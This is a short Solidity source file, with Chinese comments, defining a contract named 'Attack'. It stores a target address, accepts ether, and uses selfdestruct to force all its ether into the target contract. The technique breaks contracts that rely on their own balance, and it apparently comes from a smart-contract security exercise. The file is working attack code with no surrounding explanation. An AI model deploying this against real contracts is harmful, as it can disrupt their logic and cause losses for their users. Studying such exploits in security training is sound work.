// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address payable target;

    // 在部署时设置目标合约的地址
    constructor(address payable _target) {
        target = _target;
    }

    // 允许该合约接收以太币
    receive() external payable {}

    // 自毁合约并发送所有以太币到目标合约
    function destroy() external payable {
        selfdestruct(target);
    }
}